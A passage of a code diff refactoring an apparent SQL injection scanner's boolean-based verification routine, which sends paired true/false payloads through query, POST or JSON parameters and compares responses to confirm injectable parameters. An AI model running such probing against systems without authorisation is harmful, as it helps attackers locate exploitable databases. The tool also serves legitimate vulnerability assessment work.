-        q_true = urlencode({k: v[0] for k, v in p_true.items()}, doseq=False)
-        url_true = urlunparse((parsed.scheme, parsed.netloc, parsed.path, parsed.params, q_true, parsed.fragment))
+        p_new[key] = [v]
+        q_new = urlencode({k: val[0] for k, val in p_new.items()}, doseq=False)
+        url_new = urlunparse((parsed.scheme, parsed.netloc, parsed.path, parsed.params, q_new, parsed.fragment))
 
         if method_u == "POST" and post_data and key in post_data:
-            pd_t = deepcopy(post_data); pd_t[key] = true_p
-            return request_with_timeout("POST", url, data=pd_t, headers=headers)
+            pd = deepcopy(post_data)
+            pd[key] = v
+            return request_with_timeout("POST", url, data=pd, headers=headers)
 
-        return request_with_timeout("GET" if method_u == "GET" else "POST", url_true, data=post_data, headers=headers)
+        return request_with_timeout("GET" if method_u == "GET" else "POST", url_new, data=post_data, headers=headers)
+
+    def _send_true():
+        return _send_with_value(true_p)
 
     def _send_false():
-        if json_body is not None and json_key is not None:
-            jb_false = deepcopy(json_body); jb_false[json_key] = false_p
-            return request_with_timeout(method_u, url, headers=headers, json_body=jb_false)
-
-        parsed = urlparse(url)
-        p_false = deepcopy(original_params) if original_params else {}
-        key = param_name if param_name is not None else "_scantest"
-        p_false[key] = [false_p]
-        q_false = urlencode({k: v[0] for k, v in p_false.items()}, doseq=False)
-        url_false = urlunparse((parsed.scheme, parsed.netloc, parsed.path, parsed.params, q_false, parsed.fragment))
-
-        if method_u == "POST" and post_data and key in post_data:
-            pd_f = deepcopy(post_data); pd_f[key] = false_p
-            return request_with_timeout("POST", url, data=pd_f, headers=headers)
-
-        return request_with_timeout("GET" if method_u == "GET" else "POST", url_false, data=post_data, headers=headers)
+        return _send_with_value(false_p)
 
     true_runs = _collect_attempts(_send_true, normalize_response, attempts=verify_attempts, sleep_between=sleep_between)
     false_runs = _collect_attempts(_send_false, normalize_response, attempts=verify_attempts, sleep_between=sleep_between)
@@ -881,7 +1045,7 @@ def auto_verify_sqli(method, url, param_name, original_params, post_data, header
     if len(true_runs) < 2 or len(false_runs) < 2:
         details = {
             "verified": False,
-            "evidence": "not-enough-samples-for-phase6",
+            "evidence": "not-enough-samples-for-boolean-verify",
             "true": {"runs": len(true_runs)},
             "false": {"runs": len(false_runs)}
         }
@@ -905,7 +1069,7 @@ def auto_verify_sqli(method, url, param_name, original_params, post_data, header
     if not true_ok or not false_ok:
         details = {
             "verified": False,
-            "evidence": "unstable-responses-phase6",
+            "evidence": "unstable-responses-boolean-verify",
             "true": {"ok": true_ok, "evidence": true_ev},
             "false": {"ok": false_ok, "evidence": false_ev}
         }
@@ -915,29 +1079,39 @@ def auto_verify_sqli(method, url, param_name, original_params, post_data, header
     f = false_runs[-1]
 
     status_diff = (t["status"] != f["status"])
+    sqlerr_diff = (t["has_sql_error"] != f["has_sql_error"])
 
     bt = normalize_response(base_text or "") if normalize_response else (base_text or "")
     base_len = len(bt)
     dyn_thresh = max(30, int(base_len * 0.03))
+
     len_diff = abs(t["length"] - f["length"])
     length_diff = (len_diff > max(dyn_thresh, 30))
 
     sim_tf = difflib.SequenceMatcher(None, t["body_norm"], f["body_norm"]).ratio()
     body_diff = (sim_tf < similarity_threshold)
 
-    sqlerr_diff = (t["has_sql_error"] != f["has_sql_error"])
+    # Stronger confirm: true must look closer to baseline than false (when baseline available)
+    sim_base_true = difflib.SequenceMatcher(None, bt, t["body_norm"]).ratio() if bt else None
+    sim_base_false = difflib.SequenceMatcher(None, bt, f["body_norm"]).ratio() if bt else None
+    baseline_rule = True
+    if bt:
+        baseline_rule = (sim_base_true >= sim_base_false)
 
-    confirmed = status_diff or length_diff or body_diff or sqlerr_diff
+    confirmed = (baseline_rule and (status_diff or length_diff or body_diff or sqlerr_diff))
 
     evidence = (
-        f"phase6: true[{true_ev}] vs false[{false_ev}] | "
+        f"boolean-verify: true[{true_ev}] vs false[{false_ev}] | "
         f"compare: status_diff={status_diff}, len_diff={len_diff} (thresh={max(dyn_thresh,30)}), "
-        f"sim_tf={sim_tf:.3f}, sqlerr_diff={sqlerr_diff}"
+        f"sim_tf={sim_tf:.3f}, sqlerr_diff={sqlerr_diff}, "
+        f"sim_base_true={None if sim_base_true is None else round(sim_base_true,3)}, "
+        f"sim_base_false={None if sim_base_false is None else round(sim_base_false,3)}"
     )
 
     details = {
         "verified": bool(confirmed),
         "evidence": evidence,
+        "payloads": {"true": true_p, "false": false_p},
         "metrics": {
             "status_true": t["status"],
             "status_false": f["status"],
@@ -946,6 +1120,8 @@ def auto_verify_sqli(method, url, param_name, original_params, post_data, header
             "len_diff": len_diff,
             "baseline_len": base_len,
             "sim_true_false": sim_tf,
+            "sim_base_true": sim_base_true,
+            "sim_base_false": sim_base_false,
             "sqlerr_true": t["has_sql_error"],
             "sqlerr_false": f["has_sql_error"]
         }
@@ -955,17 +1131,10 @@ def auto_verify_sqli(method, url, param_name, original_params, post_data, header
 
 
 # ============================================================
-# Phase 7 — Advanced SQLi Reporting (Classification + Severity)
+# 8) Phase 7 — Advanced SQLi Reporting (Classification + Severity)
 # ============================================================
 
 def _map_phase_to_type(phase: str, vuln_type: str = "") -> str:
-    """
-    Map finding['phase'] or finding['vuln_type'] into report category:
-      - Error-based
-      - Blind-based
-      - Time-based
-      - UNION-based
-    """
     p = (phase or "").strip().lower()
     vt = (vuln_type or "").strip().lower()
 
@@ -1015,15 +1184,6 @@ def _default_recommendations() -> list:
 
 
 def enrich_sqli_finding_for_report(finding: dict) -> dict:
-    """
-    Enrich any SQLi finding dict into report-ready format.
-
-    Adds:
-      - report_type
-      - severity
-      - recommendations
-      - evidence (best-effort)
-    """
     if not isinstance(finding, dict):
         return finding
 
